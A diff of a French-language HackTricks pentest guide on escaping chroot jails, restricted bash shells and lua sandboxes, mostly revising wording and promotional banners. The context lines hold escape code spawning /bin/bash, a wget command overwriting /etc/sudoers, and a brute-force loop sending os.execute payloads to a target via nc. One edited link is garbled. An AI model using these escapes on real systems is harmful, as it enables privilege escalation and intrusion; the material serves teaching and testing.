@@ -1,18 +1,19 @@
-# S'échapper des Jails
+# Évasion des prisons
+
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## **GTFOBins**
 
@@ -32,7 +33,7 @@ L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé po
 {% hint style="warning" %}
 Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous échapper** en créant **un autre chroot**. Cela est possible car 2 chroots ne peuvent pas coexister (sous Linux), donc si vous créez un dossier et ensuite **créez un nouveau chroot** sur ce nouveau dossier en étant **à l'extérieur de celui-ci**, vous serez maintenant **à l'extérieur du nouveau chroot** et donc vous serez dans le FS.
 
-Cela se produit généralement car le chroot NE déplace PAS votre répertoire de travail vers celui indiqué, vous pouvez donc créer un chroot mais être à l'extérieur de celui-ci.
+Cela se produit généralement car chroot NE déplace PAS votre répertoire de travail vers celui indiqué, vous pouvez donc créer un chroot mais être à l'extérieur de celui-ci.
 {% endhint %}
 
 Généralement, vous ne trouverez pas le binaire `chroot` à l'intérieur d'une prison chroot, mais vous **pourriez le compiler, le télécharger et l'exécuter** :
@@ -88,10 +89,12 @@ chdir ".."
 chroot ".";
 system("/bin/bash");
 ```
+</details>
+
 ### Racine + Descripteur de fichier enregistré
 
 {% hint style="warning" %}
-Ceci est similaire au cas précédent, mais dans ce cas, l'**attaquant stocke un descripteur de fichier vers le répertoire actuel** puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et il **s'échappe**.
+Ceci est similaire au cas précédent, mais dans ce cas, l'**attaquant enregistre un descripteur de fichier dans le répertoire actuel** puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et il **s'échappe**.
 {% endhint %}
 
 <details>
@@ -122,13 +125,13 @@ chroot(".");
 ### Racine + Fork + UDS (Sockets de domaine Unix)
 
 {% hint style="warning" %}
-FD peut être transmis via des sockets de domaine Unix, donc :
+FD peut être transmis via les Sockets de domaine Unix, donc :
 
 * Créer un processus enfant (fork)
-* Créer des UDS pour que le parent et l'enfant puissent communiquer
+* Créer des Sockets de domaine Unix pour que le parent et l'enfant puissent communiquer
 * Exécuter chroot dans le processus enfant dans un dossier différent
 * Dans le processus parent, créer un FD d'un dossier qui se trouve en dehors du nouveau chroot du processus enfant
-* Transmettre à l'enfant ce FD en utilisant les UDS
+* Transmettre à l'enfant ce FD en utilisant les Sockets de domaine Unix
 * Le processus enfant se déplace vers ce FD, et parce qu'il est en dehors de son chroot, il s'échappera de la prison
 {% endhint %}
 
@@ -161,7 +164,7 @@ C'est possible sous Linux
 
 {% hint style="warning" %}
 * Il y a quelque temps, les utilisateurs pouvaient déboguer leurs propres processus à partir d'un processus de lui-même... mais cela n'est plus possible par défaut
-* Quoi qu'il en soit, s'il est possible, vous pourriez ptracer un processus et exécuter un shellcode à l'intérieur ([voir cet exemple](linux-capabilities.md#cap\_sys\_ptrace)).
+* Quoi qu'il en soit, s'il est possible, vous pourriez ptrace dans un processus et exécuter un shellcode à l'intérieur de celui-ci ([voir cet exemple](linux-capabilities.md#cap\_sys\_ptrace)).
 {% endhint %}
 
 ## Jails Bash
@@ -219,7 +222,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ### Autres astuces
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
 [https://gtfobins.github.io](https://gtfobins.github.io)\
 **Il pourrait également être intéressant de consulter la page :**
 
@@ -252,7 +255,7 @@ print(rawget(string, "char")(0x41, 0x42))
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Notez que chaque fois que vous exécutez la commande précédente dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque.
+Notez que chaque fois que vous exécutez la commande précédente dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -263,7 +266,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Obtenir un shell lua interactif** : Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et espérons-le illimité) en appelant :
+**Obtenir un shell lua interactif** : Si vous êtes à l'intérieur d'un shell lua limité, vous pouvez obtenir un nouveau shell lua (et espérons illimité) en appelant :
 ```bash
 debug.debug()
 ```
@@ -271,16 +274,17 @@ debug.debug()
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+{% endhint %}
